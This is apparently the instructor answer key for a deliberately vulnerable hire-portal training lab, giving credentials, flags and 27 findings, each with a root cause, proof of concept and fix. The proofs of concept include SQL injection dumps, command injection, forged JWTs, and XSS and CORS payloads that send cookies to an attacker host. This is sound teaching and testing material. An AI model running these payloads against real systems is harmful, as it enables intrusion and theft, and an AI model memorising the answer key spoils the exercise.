# Ashford Hire — Solutions (SPOILERS)

> Instructor / answer copy. Every finding below has been exploited end-to-end by `tests/selftest.py` against a live deployment.
> Replace `TARGET` with `http://<lab-ip>:8100`.

---

## 0. Technology stack (fingerprinting answer)

| Layer | Technology | How a tester can tell |
|---|---|---|
| Web framework | **ASP.NET Core 8 (C#)**, MVC + Razor views, Kestrel | `CfDJ8…` anti-forgery token prefix (Data Protection), `__rvt` hidden field + `ash_xsrf` cookie, the .NET stack trace from #27, `$type` assembly-qualified names in quote files (#25) |
| Database | **Microsoft SQL Server 2022** | `WAITFOR DELAY` works, `@@version` via UNION, T-SQL syntax (`OFFSET … FETCH`) |
| Data access | Dapper + Microsoft.Data.SqlClient, two DB logins (`ashford_app` read/write, `ashford_ro` read-only for the depot API) | `/healthz?verbose=true` (#8) |
| Serializer | Newtonsoft.Json with `TypeNameHandling.Objects` for quote files | `$type` keys in exported `.ashq` files |
| Front end | Hand-written CSS, jQuery 3.4.1, Moment.js 2.29.1, Chart.js 4.4.1 | `/lib/...` paths, Retire.js |
| Deployment | Docker Compose: `web` (Kestrel :8080), `db` (SQL Server, internal network only), `db-init` (one-shot seed) | — |

## 1. Credentials

| Username | Password | Role | Notes |
|---|---|---|---|
| `admin` | `trustno1` | admin | SHA-1 is in rockyou; near-misses (`trustno1!`, `Trustno1`) show in the activity log |
| `dispatch.qa` | `Yard!2024` | dispatcher | Leaked in the JS source map (#5) |
| `k.osei` | `Forklift#88` | dispatcher | |
| `jordan` | `Summer2024` | customer (retail) | Provided to the tester. Security answer: `Transit` |
| `megan.p` | `liverpool1` | customer (trade) | Hash crackable (staging export / SQLi) |
| `tariq` | `Groundw0rks!` | customer (trade) | |
| `lucy.b` | `sunshine1` | customer (retail) | Hash crackable; password also in the activity log |
| `dev.patel` | `Patel2023!` | customer (trade) | |
| `hannah.w` | `H4nnah-Gardens` | customer (retail) | Staging export holds her *old* hash (`hannah123`) |
| `craig.m` | `Scaff0ld99` | customer (trade) | |

## 2. Flags

| Flag | Where |
|---|---|
| `FLAG{union_all_the_way_to_the_ops_table}` | `OpsSecrets` table via SQLi (#17) |
| `FLAG{webhooks_should_not_phone_home}` | `/internal/telematics/config` via SSRF (#4) |
| `FLAG{healthz_said_far_too_much}` | `/healthz?verbose=true` (#8) |
| `FLAG{tar_balls_and_shell_calls}` | `/app/data/service/.yard-token` via command injection (#14) |
| `FLAG{head_office_dashboard_unlocked}` | `/admin` dashboard "Ops verification code" (#20 and other admin routes) |

---

## 3. Vulnerability matrix

| # | OWASP 2025 | CWE | Vulnerability | Location |
|---|---|---|---|---|
| 1 | A01 Broken Access Control | CWE-22 | Path traversal | `GET /equipment/manuals/download?file=` |
| 2 | A01 | CWE-352 | Cross-site request forgery | `POST /my/security/recovery` |
| 3 | A01 | CWE-548 | Directory listing | `GET /staging/` |
| 4 | A01 | CWE-918 | Server-side request forgery | `POST /my/integrations/test` (`url`) |
| 5 | A01 | CWE-615 / CWE-540 | Secrets in client-side source (source map) | `GET /js/app.min.js.map` |
| 6 | A01 | CWE-639 | IDOR: other customers' hire agreements | `GET /my/hires/{id}/agreement` |
| 7 | A02 Security Misconfiguration | CWE-942 | Permissive CORS (`null` + partner regex) with credentials | `/api/v2/*` |
| 8 | A02 | CWE-526 / CWE-215 | Environment and config exposure | `GET /healthz?verbose=true` |
| 9 | A02 | CWE-1004 / CWE-614 | Session cookie without HttpOnly / Secure / SameSite | `ash_session` (also `ash_pricing`) |
| 10 | A03 Supply Chain | CWE-1035 | Known-vulnerable jQuery 3.4.1 | every page |
| 11 | A03 | CWE-1395 | Known-vulnerable Moment.js 2.29.1 | every page |
| 12 | A04 Cryptographic Failures | CWE-319 | Cleartext transmission (HTTP, no HSTS) | whole site |
| 13 | A04 | CWE-328 / CWE-916 | Unsalted SHA-1 password hashes | `Users.PasswordHash`, staging export |
| 14 | A05 Injection | CWE-78 | OS command injection | `POST /yard/service/export` (`bundleName`) |
| 15 | A05 | CWE-79 | Reflected XSS (weak `<script>` filter) | `GET /availability?postcode=` |
| 16 | A05 | CWE-79 | Stored XSS (customer + staff views) | booking `SiteNotes` → `/my/hires/{id}`, `/yard` |
| 17 | A05 | CWE-89 | SQL injection (MSSQL, keyword filter bypass) | `GET /api/v2/depots?region=` |
| 18 | A06 Insecure Design | CWE-915 / CWE-266 | Mass assignment → privilege escalation | `PUT /api/v2/account` (`role`, `accountType`) |
| 19 | A06 | CWE-1021 | Clickjacking | `/my/settings` (one-click "Close my account") |
| 20 | A07 Authentication Failures | CWE-287 / CWE-347 | JWT `alg:none` accepted (+ token→web-session handoff) | `Authorization: Bearer`, `GET /auth/handoff?token=` |
| 21 | A07 | CWE-307 | No lockout / rate limit on the API login | `POST /api/v2/auth/token` |
| 22 | A07 | CWE-384 | Session fixation | `GET /estimate/resume?ref=` + login without rotation |
| 23 | A07 | CWE-640 | Weak password recovery (hidden username trusted at step 3) | `POST /account/recover` |
| 24 | A08 Software/Data Integrity | CWE-565 | Client-side pricing cookie trusted at checkout | `ash_pricing` cookie → `POST /equipment/{slug}/book` |
| 25 | A08 | CWE-502 | Insecure deserialization (Json.NET `$type`) | `POST /my/quotes/import` |
| 26 | A09 Logging & Alerting | CWE-532 | Passwords, card numbers, CVCs and security answers in logs | `/yard/activity` (`logs/activity.log`) |
| 27 | A10 Exceptional Conditions | CWE-209 / CWE-755 | Unhandled exception returns full stack trace | `GET /api/v2/hires?page=abc` |

**27 findings** (the exam baseline of 25 plus IDOR and a second A03 component, as in the reference labs). Additional low-severity observations worth a line in the report: username enumeration in password recovery step 1 ("We couldn't find an active account…"), security answers stored in plaintext, and the `X-Content-Type-Options`/`Referrer-Policy` headers being the only hardening headers present.

---

## 4. Attack chains (customer → staff → admin)

```
               ┌──────────────────────── anonymous ────────────────────────┐
 robots.txt ──▶ /staging/ (#3) ──▶ deploy notes: /internal/…, ?verbose, unsigned kiosk tokens
 view-source ─▶ app.min.js.map (#5) ──▶ dispatch.qa / Yard!2024 ─────────────┐
 /api/v2/depots SQLi (#17) ──▶ admin SHA-1 (#13) ──▶ hashcat ─▶ trustno1 ───┼──▶ ADMIN
 forged alg:none JWT sub=admin (#20) ──▶ /auth/handoff ─────────────────────┘     │
                                                                                 │
 jordan (customer) ──▶ PUT /api/v2/account {"role":"dispatcher"} (#18) ──▶ YARD  │
 YARD ──▶ /yard/activity (#26): admin's mistyped passwords ──▶ trustno1 ───────────┤
 YARD ──▶ service export cmd-injection (#14) ──▶ shell as `app`, flag             │
 jordan ──▶ webhook SSRF (#4) ──▶ /internal/telematics/config flag                │
 jordan ──▶ recovery step-3 swap (#23) ──▶ reset any user's password, incl. admin ┘
```

Shortest intended route: **source map → dispatch.qa → activity log → admin password**, or **SQLi → crack SHA-1**, or **JWT `alg:none` → handoff**.

---

## 5. Finding details

### 1. Path traversal — operator manual download (A01, CWE-22)
- **Where:** `GET /equipment/manuals/download?file=EXC-018-operator-guide.pdf` (the "Download operator guide" button on every equipment page). Unauthenticated.
- **Root cause:** `file.Replace("../","")` runs once (not recursively), then `Path.Combine(manualsDir, file)`. `Path.Combine` also discards the base directory when the second argument is absolute.
- **PoC:**
  ```
  GET /equipment/manuals/download?file=....//....//....//....//etc/passwd
  GET /equipment/manuals/download?file=/etc/passwd
  GET /equipment/manuals/download?file=/app/appsettings.json        (app config: kiosk-token flag, internal sync URL, webhook blocklist)
  GET /equipment/manuals/download?file=/proc/self/environ           (process environment: DB passwords, JWT key, flags)
  ```
- **Impact:** Read any file the `app` user can read: `/etc/passwd`, application config, `/proc/self/environ` (contains every secret from #8).
- **Fix:** Look manuals up by equipment ID from the database; never accept a path. If a filename is unavoidable, use `Path.GetFileName()`, resolve with `Path.GetFullPath()` and confirm it starts with the manuals directory.

### 2. CSRF — account recovery details (A01, CWE-352)
- **Where:** `POST /my/security/recovery` (`securityQuestion`, `securityAnswer`, `recoveryEmail`).
- **Root cause:** The form *renders* an anti-forgery token, but the action has `[IgnoreAntiforgeryToken]`, so the token isn't checked. The session cookie has no `SameSite` attribute (#9), so Firefox sends it on cross-site POSTs; any page on the same host (another port) is same-site in every browser.
- **PoC** (host it with `python3 -m http.server 9000` on the VM, then open it while signed in as the victim):
  ```html
  <form id=f method=POST action="http://TARGET/my/security/recovery">
    <input name=securityQuestion value="What was the name of your first pet?">
    <input name=securityAnswer value="pwned">
    <input name=recoveryEmail value="attacker@evil.test">
  </form><script>f.submit()</script>
  ```
  Delete `__rvt` from a captured request in Burp: it still returns `302 /my/security?saved=recovery`.
- **Impact:** Account takeover. Set the victim's security answer, then use `/account/recover`.
- **Fix:** Validate anti-forgery tokens on every state-changing action, set `SameSite=Lax`/`Strict` on the session cookie, and require the current password to change recovery details.

### 3. Directory listing — `/staging/` (A01, CWE-548)
- **Where:** `GET /staging/` (listed in `robots.txt`). Unauthenticated.
- **Root cause:** `UseFileServer(... EnableDirectoryBrowsing = true)` over a leftover UAT folder.
- **Contents:** `users_export_2024-09-14.csv` (usernames, emails, roles, **unsalted SHA-1** hashes; `megan.p`→`liverpool1` and `lucy.b`→`sunshine1` still valid), `deploy-notes-portal-3.2.txt` (internal endpoint, `?verbose=true`, unsigned kiosk tokens, weak webhook blocklist), `appsettings.Staging.json.bak` (staging secrets).
- **Fix:** Disable directory browsing, remove staging artefacts from production, and keep backups and exports out of anything the web server serves.

### 4. SSRF — webhook test (A01, CWE-918)
- **Where:** `/my/integrations` → **Send test event** → `POST /my/integrations/test` with `url=`. Any customer.
- **Root cause:** The server POSTs to any http/https URL and shows the response body. Only the literal hosts `localhost`, `127.0.0.1`, `[::1]`, `::1`, `169.254.169.254` and `metadata.google.internal` are blocked; redirects are followed.
- **PoC:**
  ```
  url=http://127.0.0.1:8080/internal/telematics/config     → "That destination isn't allowed"
  url=http://127.0.0.2:8080/internal/telematics/config     → 200, TrakNet API key + FLAG
  url=http://[::ffff:127.0.0.1]:8080/internal/telematics/config  → 200
  url=http://<your-server>/redirect-to-127.0.0.1            → also works (redirects followed)
  ```
  Note: the app listens on **8080 inside the container**, not 8100. That port appears in the deploy notes (#3), the healthz config (#8) and the stack trace (#27). `/internal/` lists `/internal/telematics/units`. A direct browser request to `/internal/...` returns 404.
- **Impact:** Access to loopback-only services, internal API keys, `FLAG{webhooks_should_not_phone_home}`. Port scanning of the internal Docker network (e.g. `http://db:1433` timing).
- **Fix:** Resolve the hostname and reject loopback, private, link-local and IPv4-mapped addresses (re-check after every redirect, or disable redirects); allow-list webhook domains; don't return response bodies to the user.

### 5. Credentials in the JavaScript source map (A01, CWE-615/540)
- **Where:** `/js/app.min.js` ends with `//# sourceMappingURL=app.min.js.map`. The map's `sourcesContent` contains the original `src/yard.js` with comments:
  ```
  // QA: dispatch board smoke tests sign in as dispatch.qa / Yard!2024
  // on-call: /healthz?verbose=true dumps the runtime config ...
  // app handoff: POST /api/v2/auth/token returns handoff_url ...
  ```
- **Impact:** Dispatcher (staff) access → chains into #14, #16 (staff side) and #26.
- **Fix:** Don't publish source maps to production; strip comments at build time; secret-scan the repository; disable QA accounts.

### 6. IDOR — hire agreements (A01, CWE-639)
- **Where:** `GET /my/hires/{id}/agreement`. Any signed-in customer.
- **Root cause:** `/my/hires/{id}` checks ownership (404 for others), but the printable agreement page queries by `Id` only.
- **PoC:** As `jordan`, open `/my/hires/1/agreement` (Megan Price's hire) and iterate IDs 1…N.
- **Impact:** Name, company, email, phone, site postcode, driver notes and card last-4 for every customer.
- **Fix:** Add `AND UserId = @currentUser` (or a staff role check) to every object lookup; use an authorization policy, not per-page code.

### 7. CORS misconfiguration (A02, CWE-942)
- **Where:** every `/api/v2/*` response.
- **Root cause:** The origin is trusted if it is the literal `null` **or** matches the unanchored regex `^https?://[^/]*ashfordhire`, and `Access-Control-Allow-Credentials: true` is sent.
- **PoC:**
  ```
  curl -i -b "ash_session=…" -H "Origin: null" TARGET/api/v2/account
  curl -i -b "ash_session=…" -H "Origin: http://ashfordhire.attacker.test" TARGET/api/v2/account
  # both reflect ACAO + ACAC:true; "Origin: http://evil.test" is not reflected
  ```
  Browser PoC with a `null` origin (sandboxed iframe):
  ```html
  <iframe sandbox="allow-scripts" srcdoc="<script>
    fetch('http://TARGET/api/v2/account',{credentials:'include'}).then(r=>r.text()).then(t=>
      fetch('http://ATTACKER:9000/?d='+btoa(t)))</script>"></iframe>
  ```
- **Impact:** Cross-origin theft of profile data, hires and the `role`/`accountType` fields; cross-origin `PUT /api/v2/account` (chains with #18).
- **Fix:** Exact-match allow-list of trusted origins; never trust `null`; anchor and escape any regex.

### 8. Environment / configuration exposure (A02, CWE-526/215)
- **Where:** `GET /healthz?verbose=true` (`/healthz` is linked as "System status" in the footer; the parameter is in the source map and deploy notes). Unauthenticated.
- **Leaks:** both DB connection strings with passwords, the **JWT signing key** (lets you forge valid HS256 tokens, an alternative to #20), the TrakNet API key, the payments gateway secret, the content root, the OS/runtime and `HEALTH_DIAGNOSTICS_TOKEN=FLAG{healthz_said_far_too_much}`.
- **Fix:** Remove the verbose mode, or restrict health details to an internal port or network; keep secrets in a vault, not in environment output.

### 9. Insecure session cookie flags (A02, CWE-1004 / CWE-614)
- `Set-Cookie: ash_session=…; path=/`: no `HttpOnly`, no `Secure`, no `SameSite`. `document.cookie` exposes it, so the XSS in #15/#16 steals sessions directly. The missing `SameSite` enables #2.
- **Fix:** `HttpOnly; Secure; SameSite=Lax` (or `Strict`).

### 10. Known-vulnerable jQuery 3.4.1 (A03, CWE-1035)
- `/lib/jquery/jquery-3.4.1.min.js` on every page. CVE-2020-11022 and CVE-2020-11023 (XSS via `.html()`/`.append()` with `<option>`/`<style>` in untrusted HTML). Retire.js flags it.
- **Fix:** Upgrade to jQuery ≥ 3.5.0 (current 3.7.x) and add dependency scanning to CI.

### 11. Known-vulnerable Moment.js 2.29.1 (A03, CWE-1395)
- `/lib/moment/moment-2.29.1.min.js`, used by the booking widget. CVE-2022-24785 (path traversal in locale loading) and CVE-2022-31129 (ReDoS in RFC 2822 parsing).
- **Fix:** Upgrade to ≥ 2.29.4 or move to a maintained library (Luxon, date-fns, `Intl`).

### 12. Cleartext transmission (A04, CWE-319)
- The whole portal, including login, card details and the API's Bearer tokens, is served over plain HTTP with no HSTS. Wireshark on the lab network shows credentials in clear text.
- **Fix:** HTTPS only, with an HTTP→HTTPS redirect, HSTS, and `Secure` cookies.

### 13. Weak password hashing — unsalted SHA-1 (A04, CWE-328/916)
- Hashes come from #17 (SQLi) or #3 (staging export): 40 hex characters, no salt.
  ```
  hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
  # admin e68e11be8b70e435c65aef8ba9798ff7775c361e : trustno1
  # megan.p 013e8975490bff350a5625ad27ca2fcb611adeed : liverpool1   lucy.b 08b314f0e1e2c41ec92c3735910658e5a82c6ba7 : sunshine1
  ```
- **Fix:** Use a slow, salted algorithm (ASP.NET Core Identity `PasswordHasher` / PBKDF2, bcrypt, Argon2id) and re-hash on next login.

### 14. OS command injection — service bundle export (A05, CWE-78)
- **Where:** `/yard/service` → **Create bundle** → `POST /yard/service/export` with `sku=EXC-018&bundleName=…`. Needs a staff session (#5, #18, #20 or #26).
- **Root cause:** `/bin/sh -c "cd …/service && tar -czf \"…/exports/{bundleName}.tar.gz\" {sku}.log && echo \"Bundle created: {bundleName}.tar.gz\""`. Only `;`, `|` and `&` are rejected.
- **PoC:**
  ```
  bundleName=x;id                → "The bundle name contains characters that aren't allowed."
  bundleName=$(id)               → Bundle created: uid=1654(app) gid=1654(app) groups=1654(app).tar.gz
  bundleName=`cat .yard-token`   → Bundle created: FLAG{tar_balls_and_shell_calls}.tar.gz
  bundleName=$(ls -la)           → directory listing in the job output
  ```
- **Impact:** Code execution as `app` in the web container: read config and secrets, pivot to the internal network.
- **Fix:** Don't shell out. Use `System.Formats.Tar`/`ZipArchive`, or pass arguments as an argument list without a shell, and allow-list the bundle name (`^[A-Za-z0-9._-]{1,60}$`).

### 15. Reflected XSS — delivery postcode check (A05, CWE-79)
- **Where:** `GET /availability?postcode=` (also the homepage hero form). Unauthenticated.
- **Root cause:** Postcodes that don't match a covered area are echoed with `@Html.Raw`. The only filter is a single-pass removal of `<script…>` / `</script>` tags.
- **PoC:**
  ```
  /availability?postcode=<img src=x onerror=alert(document.cookie)>
  /availability?postcode=<scr<script>ipt>alert(1)</scr</script>ipt>     (filter bypass → <script>alert(1)</script>)
  /availability?postcode=<svg onload=fetch('//ATTACKER:9000/?c='+document.cookie)>
  ```
  (Postcodes starting with a covered prefix like `LS1…` are HTML-encoded, so use something like `ZZ` or start with `<`.)
- **Fix:** Remove `Html.Raw`; let Razor encode. Add a Content-Security-Policy and `HttpOnly` cookies.

### 16. Stored XSS — driver site notes (A05, CWE-79)
- **Where:** Booking form field **Site access notes for the driver** (`SiteNotes`, `POST /equipment/{slug}/book`). Rendered raw on `/my/hires/{id}` **and on the staff dispatch board `/yard`** (encoded on the agreement page).
- **PoC:** Book anything with notes `<img src=x onerror=alert(document.domain)>`, then open the hire (customer) or `/yard` (dispatcher). With #9, a payload such as `<img src=x onerror="new Image().src='//ATTACKER:9000/?c='+document.cookie">` steals every dispatcher's and admin's session.
- **Impact:** Customer-to-staff session hijacking.
- **Fix:** Encode output (remove `Html.Raw`), or sanitize with an allow-list sanitizer if rich text is needed. Add CSP and `HttpOnly`.

### 17. SQL injection — depot API (A05, CWE-89) — Microsoft SQL Server
- **Where:** `GET /api/v2/depots?region=West%20Yorkshire` (called by the `/depots` page). Unauthenticated. Query: `SELECT Code, Name, Town, Postcode, Phone FROM Depots WHERE IsActive = 1 AND Region = '<input>' ORDER BY Name` (5 string columns). DB errors return a generic `{"error":"Depot lookup failed"}`, and a naive filter blocks `union\s+select`.
- **PoC:**
  ```
  region=West Yorkshire' AND 1=1--      → 3 depots     (boolean true)
  region=West Yorkshire' AND 1=2--      → 0 depots     (boolean false)
  region=x';WAITFOR DELAY '0:0:5'--     → 5 s delay    (stacked/time-based)
  region=x' UNION SELECT 1,2,3,4,5--    → 400 "Invalid region"   (filter)
  region=x' UNION ALL SELECT @@version,DB_NAME(),SYSTEM_USER,'4','5'--
  region=x' UNION/**/SELECT name,'2','3','4','5' FROM sys.tables--
  region=x' UNION ALL SELECT Username,PasswordHash,Role,Email,CAST(Id AS nvarchar(10)) FROM Users--
  region=x' UNION ALL SELECT Name,Value,Notes,Notes,Notes FROM OpsSecrets--
  ```
  `region=x' OR IsActive=0--` reveals the hidden, closed Hull depot (a quick proof that the WHERE clause is controllable).
  sqlmap (verified): `sqlmap -u "TARGET/api/v2/depots?region=North+Yorkshire" -p region --dbms=mssql --technique=BUT --batch -T Users -C Username,PasswordHash --dump` finds boolean-based blind **and** UNION (sqlmap uses `UNION ALL SELECT`, which the `union\s+select` filter doesn't match) and dumps the table. Manually, `UNION ALL SELECT` or `UNION/**/SELECT` bypass the filter.
- **Impact:** All password hashes (#13), customer PII, `OpsSecrets` (`FLAG{union_all_the_way_to_the_ops_table}`, backup API keys, SMTP password). The read-only login (`ashford_ro`) prevents writes and `xp_cmdshell`.
- **Fix:** Parameterized query (`WHERE Region = @region`); keep the least-privilege login; never rely on keyword blocklists.

### 18. Mass assignment → privilege escalation (A06, CWE-915/266)
- **Where:** `PUT /api/v2/account` (used by `/my/profile`). `GET /api/v2/account` reveals the `role` and `accountType` fields.
- **Root cause:** `JsonConvert.PopulateObject(body, currentUser)` binds every public property; the UPDATE then writes `Role` and `AccountType`. Only an upgrade to `admin` is reverted.
- **PoC:**
  ```http
  PUT /api/v2/account
  Content-Type: application/json
  Cookie: ash_session=…

  {"fullName":"Jordan Hale","email":"jordan.hale@halelandscapes.co.uk","role":"dispatcher","accountType":"trade"}
  ```
  → `"role":"dispatcher"`; `/yard` now opens. `"accountType":"trade"` gives 15% trade pricing at the next sign-in. `"role":"admin"` is silently ignored.
- **Fix:** Bind to a dedicated DTO with only the editable fields; manage roles only from admin endpoints.

### 19. Clickjacking — preferences / close account (A06, CWE-1021)
- Every page sends `X-Frame-Options: DENY` + `frame-ancestors 'none'` **except** `/my/settings`, which has a one-click **Close my account** button (POST with a valid anti-forgery token, so CSRF doesn't work, but framing does).
- **PoC:**
  ```html
  <style>iframe{opacity:.05;position:absolute;top:0;left:0;width:1200px;height:900px;z-index:2}
  button{position:absolute;top:610px;left:330px;z-index:1}</style>
  <button>Claim your free hire day</button>
  <iframe src="http://TARGET/my/settings"></iframe>
  ```
  (Adjust offsets to the button position. Use a throwaway account. Closing `jordan` means running `./reset.sh`.)
- **Fix:** Send `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'` globally; ask for confirmation (re-type the password) before closing an account.

### 20. Improper authentication — JWT `alg:none` + handoff (A07, CWE-287/347)
- **Where:** `POST /api/v2/auth/token` issues an HS256 JWT `{"sub":"jordan","role":"customer",…}` and a `handoff_url` (`/auth/handoff?token=…`, the "Open in browser" feature on `/mobile`). Every API endpoint accepts `Authorization: Bearer`, and `/auth/handoff` turns any accepted token into a **web session**.
- **Root cause:** `TokenService.Validate` skips signature verification when the header says `"alg":"none"` ("kiosk tokens", see the deploy notes). The identity comes from `sub` (the username), not the `role` claim.
- **PoC:**
  ```
  header  {"alg":"none","typ":"JWT"}            → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  payload {"sub":"admin","exp":4102444800}      → eyJzdWIiOiJhZG1pbiIsImV4cCI6NDEwMjQ0NDgwMH0
  token   = header + "." + payload + "."

  curl -H "Authorization: Bearer <token>" TARGET/api/v2/account          → "username":"admin"
  browser: TARGET/auth/handoff?token=<token>                              → lands on /admin, FLAG{head_office_dashboard_unlocked}
  ```
  `jwt_tool <token> -X a` automates it. Alternatively, sign a valid HS256 token with the key leaked in #8.
- **Fix:** Pin the algorithm (`HS256`/`RS256`) and reject `none`; use the framework's JWT bearer handler; make handoff tokens single-use and short-lived.

### 21. No lockout / rate limiting on API login (A07, CWE-307)
- `POST /signin` locks an account for 10 minutes after 5 failures; **`POST /api/v2/auth/token` checks the same passwords with no counter, no lockout and no rate limit**, and also works while the web login is locked.
- **PoC:** Burp Intruder or
  ```
  ffuf -u TARGET/api/v2/auth/token -X POST -H "Content-Type: application/json" \
       -d '{"username":"admin","password":"FUZZ"}' -w /usr/share/wordlists/rockyou.txt -mc 200
  ```
  → `trustno1`.
- **Fix:** Share lockout and throttling across every authentication path; add per-IP rate limiting and MFA for staff and admin accounts.

### 22. Session fixation — shared estimate link (A07, CWE-384)
- **Where:** Anonymous visitors get an `ash_session` cookie for their estimate basket. `/estimate` offers a **Share this estimate** link `/estimate/resume?ref=<session id>`. The `ref` value *is* the session cookie, and following it sets the visitor's cookie to that ID. Signing in binds the user to the existing session without issuing a new ID.
- **PoC:** Attacker visits the site and notes their `ash_session` (or copies the share link) → sends the victim `TARGET/estimate/resume?ref=<attacker sid>` → victim signs in → attacker refreshes `/my` with the same cookie and is signed in as the victim.
- **Fix:** Issue a new session ID at login and logout; never set session identifiers from URLs; share estimates with a separate random token.

### 23. Weak password recovery — step 3 trusts the hidden username (A07, CWE-640)
- **Where:** `/account/recover` (three steps: username → security question → new password).
- **Root cause:** Step 2 sets a session flag `RecoveryVerified = true` without recording *which* user was verified. Step 3 resets the password for whatever `username` the hidden field contains.
- **PoC:** Register your own account (you know its answer) → steps 1–2 as yourself → intercept step 3 and change `username=yourname` to `username=admin` (or `k.osei`) → sign in as that user with the new password.
  Also: step 1 enumerates usernames, step 2 has no attempt limit, and answers such as football teams or birth towns are guessable.
- **Impact:** Takeover of any account, including admin.
- **Fix:** Use emailed single-use, time-limited reset tokens bound to the account; keep server-side state of the verified user ID; rate-limit verification.

### 24. Client-side pricing cookie trusted (A08, CWE-565)
- **Where:** At sign-in the server sets `ash_pricing=base64({"tier":"retail","discount":0,"currency":"GBP"})` (trade: `discount:15`). The booking JS reads it to show the discount, **and the server applies `discount` from the cookie** at `POST /equipment/{slug}/book`.
- **PoC:**
  ```
  echo -n '{"tier":"trade","discount":100}' | base64 | tr -d '='   → eyJ0aWVyIjoidHJhZGUiLCJkaXNjb3VudCI6MTAwfQ
  ```
  Replace the cookie, then book a Telehandler: the hire is confirmed at **£0.00** (and `discount:15` gives a retail user trade pricing).
- **Fix:** Derive pricing server-side from the user's account record; if state must live on the client, sign it (HMAC/Data Protection) and verify it.

### 25. Insecure deserialization — quote import (A08, CWE-502)
- **Where:** `/my/quotes` → **Export** produces `Q-xxxxx.ashq` = base64 of Json.NET output with `TypeNameHandling.Objects`:
  ```json
  {"$type":"Ashford.Web.Quotes.QuoteDocument, Ashford.Web", ...,
   "Terms":{"$type":"Ashford.Web.Quotes.TemplateDocument, Ashford.Web",
            "Title":"Hire terms and conditions (v3)",
            "TemplatePath":"/app/data/templates/hire-terms-v3.txt"}}
  ```
  **Import** (`POST /my/quotes/import`, file or pasted base64/JSON) deserializes it with the same settings and shows a preview including `Terms.Content`.
- **Root cause:** Attacker-controlled `$type`. The `TemplateDocument` gadget has an `[OnDeserialized]` callback that reads `TemplatePath` from disk.
- **PoC:** Change `TemplatePath` to `/etc/passwd`, `/proc/self/environ` or `/app/appsettings.json`, re-encode (or paste raw JSON) and import → the file contents appear in the terms preview. Setting `$type` to a non-existent type returns Json.NET's verbose `Error resolving type specified in JSON '…'`, which confirms type-name handling is on.
- **Impact:** Arbitrary file read (secrets, environment variables) and instantiation of arbitrary `IQuoteAttachment` types. With a richer gadget in scope this is the classic route to RCE (ysoserial.net).
- **Fix:** `TypeNameHandling.None`, or a strict `ISerializationBinder` allow-list; no side effects in deserialization callbacks; sign exported files.

### 26. Sensitive data in logs (A09, CWE-532)
- **Where:** `/yard/activity` (dispatchers and admins) shows `logs/activity.log`.
- **Contents:** `AUTH FAIL user=… password=<attempted password>` (the admin's near-misses `trustno1!` / `Trustno1`), `BOOKING … card=<full PAN> exp=… cvc=…`, `RECOVERY VERIFY … answer=…`, `RECOVERY RESET … newpassword=…`, `RECOVERY-UPDATE … answer=…`. Your own test traffic appears here live.
- **Impact:** Credential and card-data disclosure to every depot employee (also a PCI-DSS breach). Gives the admin password.
- **Fix:** Never log secrets, PANs or CVCs (mask to last 4); restrict and monitor log access; alert on repeated failures instead of recording the passwords.

### 27. Verbose exception handling (A10, CWE-209/755)
- **Where:** `GET /api/v2/hires?page=abc` (or `size=abc`) with any session or Bearer token.
- **Root cause:** `int.Parse` on raw input; the API exception middleware returns `ex.ToString()`.
- **Response:** `System.FormatException`, full stack trace with file paths (`/src/Ashford.Web/Controllers/ApiController.cs:line …`), host name `ash-web-02`, `.NET 8.0.x`, OS, content root `/app`, environment `Production`.
- **Impact:** Stack fingerprinting and internal paths. Helps with #4 (port 8080), #14 and #25.
- **Fix:** Use `int.TryParse` / model validation; return a generic RFC 7807 problem response with a correlation ID; log details server-side only.

---

## 6. Containment notes (instructor)

- The web container runs as the non-root `app` user; the DB is on an internal-only Docker network and is never published.
- SQLi runs under the read-only `ashford_ro` login (no writes, no `xp_cmdshell`); every other query is parameterized.
- Every other form validates anti-forgery tokens; output is Razor-encoded except the three XSS sinks; framing is denied everywhere except `/my/settings`.
- `./reset.sh` rebuilds everything from scratch (seed data, logs, accounts).

## 7. Verification

```bash
./reset.sh
python3 tests/selftest.py        # expected: 27 passed, 0 failed
./reset.sh                       # the self-test creates bookings and throwaway accounts
```
